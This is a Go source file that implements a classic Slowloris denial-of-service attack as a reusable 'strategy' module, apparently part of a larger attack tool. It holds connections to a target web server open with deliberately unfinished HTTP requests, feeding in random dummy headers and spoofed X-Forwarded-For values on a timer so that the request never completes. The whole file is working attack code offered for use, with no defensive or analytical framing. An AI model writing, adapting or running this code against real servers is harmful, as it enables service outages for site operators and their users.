package strategy

import (
	"context"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"sync/atomic"
	"time"
)

type SlowlorisClassic struct {
	keepAliveInterval time.Duration
	connectionTimeout time.Duration
	maxSessionLife    time.Duration
	userAgents        []string
	activeConnections int64
	localAddr         *net.TCPAddr
}

func NewSlowlorisClassic(keepAliveInterval time.Duration, bindIP string) *SlowlorisClassic {
	return &SlowlorisClassic{
		keepAliveInterval: keepAliveInterval,
		connectionTimeout: 10 * time.Second,
		maxSessionLife:    5 * time.Minute,
		userAgents:        defaultUserAgents,
		localAddr:         newLocalTCPAddr(bindIP),
	}
}

func (s *SlowlorisClassic) Execute(ctx context.Context, target Target) error {
	parsedURL, host, useTLS, err := parseTargetURL(target.URL)
	if err != nil {
		return err
	}

	sessionCtx, cancel := context.WithTimeout(ctx, s.maxSessionLife)
	defer cancel()

	var conn net.Conn
	dialer := &net.Dialer{
		Timeout:   s.connectionTimeout,
		LocalAddr: s.localAddr,
	}

	if useTLS {
		tlsConfig := &tls.Config{
			ServerName:         parsedURL.Hostname(),
			InsecureSkipVerify: false,
		}
		conn, err = tls.DialWithDialer(dialer, "tcp", host, tlsConfig)
	} else {
		conn, err = dialer.DialContext(sessionCtx, "tcp", host)
	}

	if err != nil {
		return fmt.Errorf("connection failed: %w", err)
	}
	defer conn.Close()
	atomic.AddInt64(&s.activeConnections, 1)
	defer atomic.AddInt64(&s.activeConnections, -1)

	userAgent := s.userAgents[rand.Intn(len(s.userAgents))]
	path := parsedURL.Path
	if path == "" {
		path = "/"
	}

	// Send incomplete HTTP request (no final \r\n to terminate headers)
	// This is the core of Slowloris: keep the request perpetually incomplete
	incompleteRequest := fmt.Sprintf(
		"GET %s?%d HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
			"Accept-Language: en-US,en;q=0.5\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Connection: keep-alive\r\n",
		path,
		rand.Intn(100000),
		parsedURL.Host,
		userAgent,
	)

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if _, err := conn.Write([]byte(incompleteRequest)); err != nil {
		return fmt.Errorf("failed to write incomplete request: %w", err)
	}

	ticker := time.NewTicker(s.keepAliveInterval)
	defer ticker.Stop()

	for {
		select {
		case <-sessionCtx.Done():
			return nil
		case <-ticker.C:
			// Send additional header to keep connection alive
			// Never send \r\n\r\n which would complete the request
			dummyHeader := s.generateDummyHeader()

			conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := conn.Write([]byte(dummyHeader)); err != nil {
				return fmt.Errorf("dummy header failed: %w", err)
			}
		}
	}
}

func (s *SlowlorisClassic) generateDummyHeader() string {
	headerType := rand.Intn(5)

	switch headerType {
	case 0:
		return fmt.Sprintf("X-a: %d\r\n", rand.Intn(5000))
	case 1:
		return fmt.Sprintf("X-%d: %d\r\n", rand.Intn(1000), rand.Intn(5000))
	case 2:
		return fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n",
			rand.Intn(255)+1, rand.Intn(256), rand.Intn(256), rand.Intn(254)+1)
	case 3:
		letters := "abcdefghijklmnopqrstuvwxyz0123456789"
		cookie := make([]byte, 16)
		for i := range cookie {
			cookie[i] = letters[rand.Intn(len(letters))]
		}
		return fmt.Sprintf("Cookie: sess=%s\r\n", string(cookie))
	default:
		headerNames := []string{"Cache-Control", "Pragma", "DNT", "Upgrade-Insecure-Requests"}
		headerName := headerNames[rand.Intn(len(headerNames))]
		return fmt.Sprintf("X-%s: %d\r\n", headerName, rand.Intn(99999))
	}
}

func (s *SlowlorisClassic) Name() string {
	return "slowloris-classic"
}

func (s *SlowlorisClassic) ActiveConnections() int64 {
	return atomic.LoadInt64(&s.activeConnections)
}
